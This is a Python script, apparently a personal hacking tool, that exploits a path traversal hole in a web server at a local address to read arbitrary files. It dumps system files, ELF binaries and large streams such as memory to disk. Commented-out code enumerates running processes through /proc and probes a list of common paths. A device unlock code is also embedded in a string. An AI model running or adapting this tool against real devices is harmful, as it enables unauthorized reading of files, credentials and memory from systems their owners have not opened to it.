import requests, socket, os
import traverse

url = "10.0.0.127"

# ANSI escape color codes
RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
BLUE   = "\033[34m"
MAGENTA = "\033[35m"
CYAN   = "\033[36m"
RESET  = "\033[0m"

def get_chunks(sox, stream=False):
    fux = b''
    f = open("STREAM_DUMP.bytes", 'ab+')
    while True:
        chunk = sox.recv(4096)
        if not chunk:
            break
        if stream:
            f.write(chunk)
        fux += chunk
    sox.close()
    f.close()
    return fux

def fetch_it(url, getdir, bdumpAsBinary=False, output_file=None, port=80, streamit=False):
    s = socket.socket()
    s.connect((url, port))
    s.send(f"GET {getdir} HTTP/1.0\r\n\r\n".encode())
    
    response = get_chunks(s, stream=streamit )
    
    if bdumpAsBinary:
        header_end = response.find(b'\r\n\r\n')
        body = response[header_end + 4:] if header_end != -1 else response
        
        if output_file:
            with open(output_file, 'wb') as f:
                f.write(body)
            with open(output_file, 'rb') as f:
                magic = f.read(4)
            magic = body[:4]
            if magic == b'\x7fELF':
                msg = "✅ Valid ELF!"
            else:
                msg = f"❌ Bad magic: {magic.hex()}"
            print(f"Wrote {len(body)} bytes. {msg}")
        
        return body
    
    # Text mode
    text = response.decode('utf-8', errors='ignore')
    if output_file:
        with open(output_file, 'w') as f:
            f.write(text)
        print(f"[+] Saved to {output_file}")
    
    return text


def parse_traverse():
    hopto = input("[Path to dump?]>  ")
    path = f"{traverse.TRAV_DEPTH}{hopto[1:]}"
    if hopto.startswith("x"):
        return False, None
    elif hopto.startswith("$"):
        result = fetch_it(url, path, streamit=True, output_file=os.path.basename(hopto))
    elif hopto.startswith("!"):
        result = fetch_it(url, path, bdumpAsBinary=True, output_file=os.path.basename(hopto))
    elif hopto.startswith("@"):
        result = fetch_it(url, path, output_file=os.path.basename(hopto))
    else:
        result = fetch_it(url, path)
    
    return True, result

Traversssssaaaahhh = """
~ ~ ~ Traversssssaaaahhh ~ ~ ~
x(exit)
$[/path/to/largesomething - streams bytes to file, for dumping something like RAM.
![/path/to/bin] dump elf/bin as bytes
@[/path/to/shi] dump as ascii or wtever
[/path/to/shi] print dont save
Look, its shittyish and crammed together, just make the 
path correct. Leading /, just do it lol.
"""
print(Traversssssaaaahhh)
Go = True
while Go:
    Go, result = parse_traverse()
    if result is not None:
        print(result)

"""
MOTO UNLOCK CODE: PXZNKUFTSEC6TDZOGGJ4
"""

"""

import re
def piddump(noonkey_ip_addr):
    good_pids = {}
    
    for pid in range(0,1000):
        resp = fetch_it(noonkey_ip_addr, f"{traverse.TRAV_DEPTH}proc/{pid}/status")
    
        if resp and resp.startswith("HTTP/1.0 200 OK"):
            print(f"[+] Found process: {pid}")
            match = re.search(r'Name:\s*(\S+)', resp)
            name = match.group(1) if match else "Name not found"
            good_pids[pid]=name
    
    print("\n=== Paths returning 200 OK ===")
    return good_pids
pidNname = piddump('10.0.0.127')
print(pidNname)

"""

"""

good_paths = []

for path in traverse.common_paths:
    target = f"{traverse.TRAV_DEPTH}{path}"
    resp = fetch_it('10.0.0.127', target)

    if resp and resp.startswith("HTTP/1.0 200 OK"):
        print(f"[+] Got 200 @ {path}")
        good_paths.append(path)

print("\n=== Paths returning 200 OK ===")
print(good_paths)

"""
